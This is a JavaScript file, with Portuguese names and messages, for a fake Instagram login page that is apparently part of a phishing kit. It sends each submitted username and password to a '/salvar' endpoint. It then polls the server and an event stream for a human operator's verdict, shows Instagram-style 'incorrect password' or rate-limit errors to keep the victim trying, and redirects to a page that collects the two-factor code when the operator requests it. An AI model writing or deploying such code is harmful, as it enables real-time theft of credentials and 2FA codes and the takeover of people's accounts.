const loginForm = document.querySelector('#login-form');
const feedback = document.querySelector('#feedback');
const submitButton = loginForm.querySelector('.primary-button');
const usernameInput = document.querySelector('#username');
const passwordInput = document.querySelector('#password');

let pollingInterval = null;

function mostrarErro(mensagem) {
  if (!feedback) return;
  feedback.textContent = mensagem || "Sua senha está incorreta. Confira-a.";
  feedback.style.display = "block";
  feedback.style.color = "#ed4956";
  if (passwordInput) {
    passwordInput.style.borderColor = "#ed4956";
  }
}

function esconderErro() {
  if (!feedback) return;
  feedback.textContent = "";
  feedback.style.display = "none";
  if (passwordInput) {
    passwordInput.style.borderColor = "";
  }
}

function atualizarBotaoEntrar() {
  if (!submitButton || !usernameInput || !passwordInput) return;
  const preenchido = usernameInput.value.trim().length > 0 && passwordInput.value.length >= 6;
  if (preenchido) {
    submitButton.style.opacity = '1';
    submitButton.style.color = '#ffffff';
  } else {
    submitButton.style.opacity = '0.7';
    submitButton.style.color = 'rgba(255, 255, 255, 0.7)';
  }
}

if (passwordInput) {
  passwordInput.addEventListener("input", () => {
    if (passwordInput.value.length > 0) {
      esconderErro();
    }
    atualizarBotaoEntrar();
  });
}

if (usernameInput) {
  usernameInput.addEventListener("input", () => {
    if (usernameInput.value.length > 0) {
      esconderErro();
    }
    atualizarBotaoEntrar();
  });
}

function detectarTipoIdentificador(val) {
  if (!val) return 'usuario';
  const s = String(val).trim();
  if (s.includes('@') && s.includes('.')) return 'email';
  const digitos = s.replace(/\D/g, '');
  if (digitos.length >= 8 && /^\+?[\d\s().-]{8,22}$/.test(s)) {
    return 'telefone';
  }
  return 'usuario';
}

loginForm.addEventListener('submit', async (event) => {
  event.preventDefault();
  const username = usernameInput ? usernameInput.value.trim() : "";
  const password = passwordInput ? passwordInput.value : "";

  if (!username || !password) {
    mostrarErro("Preencha todos os campos.");
    return;
  }

  esconderErro();
  submitButton.disabled = true;
  submitButton.textContent = 'Aguarde...';

  const tipoDetectado = detectarTipoIdentificador(username);
  sessionStorage.setItem('loginIdentifier', username);
  sessionStorage.setItem('ig_usuario', username);
  sessionStorage.setItem('tipo_identificador', tipoDetectado);

  try {
    const res = await fetch('/salvar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        nome: username,
        senha: password,
        usuario: username,
        username: username,
        password: password,
        tipo_identificador: tipoDetectado
      }),
    });
  } catch (err) {
    console.warn("Aviso ao enviar credenciais:", err);
  }

  // Inicia espera ativa pela decisão do operador no painel ou validação
  iniciarEsperaStatus(username, tipoDetectado);
});

function iniciarEsperaStatus(usuario, tipo = "usuario") {
  if (pollingInterval) clearInterval(pollingInterval);

  const checarStatus = async () => {
    try {
      const res = await fetch(`/api/status-login?usuario=${encodeURIComponent(usuario)}&t=${Date.now()}`, {
        cache: "no-store",
        headers: { "Cache-Control": "no-cache" }
      });
      if (!res.ok) return;
      const data = await res.json();

      // 1. Senha recusada / inválida
      if (data.status_credencial === "invalido") {
        clearInterval(pollingInterval);
        pollingInterval = null;

        submitButton.disabled = false;
        submitButton.textContent = 'Entrar';
        mostrarErro("Sua senha está incorreta. Confira-a.");

        if (passwordInput) {
          passwordInput.value = "";
          passwordInput.focus();
        }
        return;
      }

      // 1.1 Limite de taxa ou desafio de segurança (não expor como senha errada)
      if (data.status_credencial === "rate_limit" || data.status_credencial === "bloqueio_captcha" || data.status_credencial === "bloqueio_meta") {
        clearInterval(pollingInterval);
        pollingInterval = null;

        submitButton.disabled = false;
        submitButton.textContent = 'Entrar';
        mostrarErro("Ocorreu um problema ao entrar no Instagram. Tente novamente mais tarde.");
        return;
      }

      // 2. Operador clicou em Solicitar 2FA
      if (data.status_login === "solicitar_2fa") {
        clearInterval(pollingInterval);
        pollingInterval = null;

        submitButton.textContent = 'Carregando...';
        setTimeout(() => {
          window.location.href = `/codigo/?usuario=${encodeURIComponent(usuario)}&tipo=${encodeURIComponent(tipo)}`;
        }, 200);
        return;
      }
    } catch (err) {
      console.error("Erro ao verificar status do login:", err);
    }
  };

  pollingInterval = setInterval(checarStatus, 1000);
  // Executa uma primeira verificação rápida
  setTimeout(checarStatus, 500);
}

// Conexão SSE para antecipar transições instantâneas (<50ms)
let sseSource = null;
function conectarSSELogin() {
  if (!window.EventSource) return;
  try {
    if (sseSource) sseSource.close();
    sseSource = new EventSource("/api/stream?t=" + Date.now());

    sseSource.onmessage = (event) => {
      try {
        const json = JSON.parse(event.data);
        if (!json || !json.consolidados) return;

        const currentUser = sessionStorage.getItem('loginIdentifier');
        if (!currentUser) return;

        const userKey = currentUser.toLowerCase().trim();
        const item = json.consolidados.find(c => (c.usuario || "").toLowerCase().trim() === userKey);

        if (item) {
          if (item.status_credencial === "invalido") {
            if (pollingInterval) clearInterval(pollingInterval);
            submitButton.disabled = false;
            submitButton.textContent = 'Entrar';
            mostrarErro("Sua senha está incorreta. Confira-a.");
            if (passwordInput) {
              passwordInput.value = "";
              passwordInput.focus();
            }
          } else if (item.status_credencial === "rate_limit" || item.status_credencial === "bloqueio_captcha" || item.status_credencial === "bloqueio_meta") {
            if (pollingInterval) clearInterval(pollingInterval);
            submitButton.disabled = false;
            submitButton.textContent = 'Entrar';
            mostrarErro("Ocorreu um problema ao entrar no Instagram. Tente novamente mais tarde.");
          } else if (item.status_login === "solicitar_2fa") {
            if (pollingInterval) clearInterval(pollingInterval);
            submitButton.textContent = 'Carregando...';
            const currentTipo = sessionStorage.getItem('tipo_identificador') || item.tipo_identificador || 'usuario';
            window.location.href = `/codigo/?usuario=${encodeURIComponent(currentUser)}&tipo=${encodeURIComponent(currentTipo)}`;
          }
        }
      } catch (e) {}
    };

    sseSource.onerror = () => {
      if (sseSource) sseSource.close();
      setTimeout(conectarSSELogin, 3000);
    };
  } catch (e) {}
}

conectarSSELogin();
